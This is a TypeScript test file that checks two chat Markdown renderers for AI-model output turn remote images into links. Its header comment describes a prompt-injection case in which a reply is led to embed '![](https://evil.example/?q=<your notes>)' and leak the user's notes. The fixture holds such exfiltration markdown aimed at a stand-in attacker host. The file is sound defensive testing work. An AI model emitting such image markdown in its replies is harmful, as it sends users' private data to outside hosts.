/**
 * Markdown from a model never loads a remote image (src/features/chat/Markdown.tsx,
 * src/features/conversation/ChatMarkdown.tsx): a reply that a prompt
 * injection talked into "![](https://evil.example/?q=<your notes>)" would
 * send the notes to that host the moment it is drawn. It shows a link.
 *
 *   bun test packages/web/test/markdown-images.test.tsx
 */
import { describe, expect, test } from 'bun:test';
import { renderToStaticMarkup } from 'react-dom/server';
import { Markdown } from '../src/features/chat/Markdown';
import { ChatMarkdown } from '../src/features/conversation/ChatMarkdown';

const md = 'Here it is: ![chart](https://evil.example/p.png?q=secret) and ![](https://evil.example/2.png)';

describe('images in model markdown', () => {
  for (const [name, View] of [
    ['session log', Markdown],
    ['chat', ChatMarkdown],
  ] as const) {
    test(`${name}: a link, never an image`, () => {
      const html = renderToStaticMarkup(<View text={md} />);
      expect(html).not.toContain('<img');
      expect(html).toContain('href="https://evil.example/p.png?q=secret"');
      expect(html).toContain('>chart</a>');
      expect(html).toContain('>Image</a>');
    });
  }
});
